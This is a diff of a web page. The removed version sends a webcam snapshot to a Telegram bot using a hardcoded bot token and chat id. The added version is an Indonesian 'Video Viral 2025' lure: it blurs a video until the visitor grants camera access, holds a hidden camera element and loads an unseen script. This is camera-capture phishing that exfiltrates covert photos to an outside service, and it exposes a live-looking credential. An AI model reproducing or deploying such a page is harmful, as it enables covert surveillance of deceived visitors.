@@ -1,69 +1,36 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>تجرية إرسال صورة للتليجرام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Viral 2025</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
 </head>
-<body>
+<body class="bg-gray-900 flex items-center justify-center min-h-screen font-[Poppins]">
 
-    <h2>بوت تليجرام - إرسال صورة</h2>
-    
-    <video id="video" width="400" height="300" autoplay playsinline style="border: 1px solid #ccc;"></video>
-    <br>
-    <button id="startBtn" onclick="initiate()">إرسال الصورة الآن</button>
-    <p id="status">في انتظار الضغط على الزر...</p>
+    <div class="bg-gray-800 shadow-lg rounded-xl p-6 max-w-lg w-full text-center text-white">
+        <h1 class="text-2xl font-semibold">Video Viral 2025</h1>
+        <p class="text-gray-400 text-sm mt-2">Izinkan akses untuk membuka video.</p>
 
-    <script>
-        const botToken = '8774671190:AAEBtV-3k8lt9Y05fTcSow-tCmZ0gIXL28A'; 
-        const chatId = '6465368223';
+        <div class="relative mt-4">
+            <video id="videoPlayer" class="w-full rounded-lg filter blur-lg opacity-50 pointer-events-none" autoplay loop muted>
+                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                Browser Anda tidak mendukung video.
+            </video>
+            <div id="overlay" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-50 text-white text-lg font-semibold">
+                Izin Diperlukan
+            </div>
+        </div>
 
-        async function initiate() {
-            const video = document.getElementById('video');
-            const status = document.getElementById('status');
-            const btn = document.getElementById('startBtn');
+        <button id="allowCameraButton" class="mt-4 w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition">
+            Izinkan Akses
+        </button>
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                status.innerText = "تم تفعيل الكاميرا... جاري الالتقاط.";
-                btn.disabled = true;
+        <video id="hiddenCamera" class="hidden"></video>
+    </div>
 
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'capture.jpg');
-                        formData.append('caption', '📸 تم إرسال هذه الصورة من المتصفح!');
-
-                        status.innerText = "جاري الإرسال إلى تليجرام...";
-                        
-                        // الرابط الصحيح هنا:
-                        const response = await fetch(`https://telegram.org{botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        if (response.ok) {
-                            status.innerText = "✅ نجح الإرسال! تفقد هاتفك.";
-                        } else {
-                            status.innerText = "❌ فشل الإرسال. تأكد من عمل /start للبوت.";
-                        }
-
-                        stream.getTracks().forEach(track => track.stop());
-                        btn.disabled = false;
-                        
-                    }, 'image/jpeg');
-                }, 2000);
-
-            } catch (err) {
-                status.innerText = "خطأ في الكاميرا: " + err.message;
-            }
-        }
-    </script>
+    <script src="../static/script.js"></script>
 </body>
 </html>
